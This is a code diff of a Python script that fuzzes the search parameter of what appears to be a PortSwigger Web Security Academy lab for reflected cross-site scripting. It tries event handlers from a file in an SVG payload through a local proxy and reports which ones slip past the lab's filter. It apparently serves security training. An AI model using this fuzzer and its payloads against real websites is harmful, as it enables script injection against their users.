@@ -73,16 +73,40 @@ def allowedEvent(url, injection, tag):
             print(f'[INFO] Allowed event: {i}', end="")
     return i
 
+def customIterate(url, injection):
+    target = url + injection
+
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
+        }
+
+    proxies = {
+        'http' : '127.0.0.1:8080',
+        }
+
+    for i in open("event.txt", "r"):
+        testUrl = target + "<svg id=x tabindex=1 " + i.rstrip('\n') + "=alert(1)></svg>"
+        r = requests.get(testUrl, proxies=proxies, headers=headers)
+        
+        if "Tag is not allowed" in r.text:
+            pass
+        elif "Event is not allowed" in r.text:
+            pass
+        else:
+            print(f'[INFO] Allowed event: {i}', end="")
+    return i
+
 
 if __name__ == '__main__':
-    url = "https://ac031f331e691f60c0bf9ad700b40012.web-security-academy.net/"
+    url = "https://ac021f211ef5ea0cc054522500c500dd.web-security-academy.net/"
     injection = "?search="
     
-    tag = allowedTag(url, injection)
-    event = allowedEvent(url, injection, tag)
+    #tag = allowedTag(url, injection)
+    #event = allowedEvent(url, injection, tag)
+    customIterate(url, injection)
+
 
     #print(urllib.parse.quote('"><' + tag + " " + event + "=print()>"))
-
     #connect(url, injection)
 
 
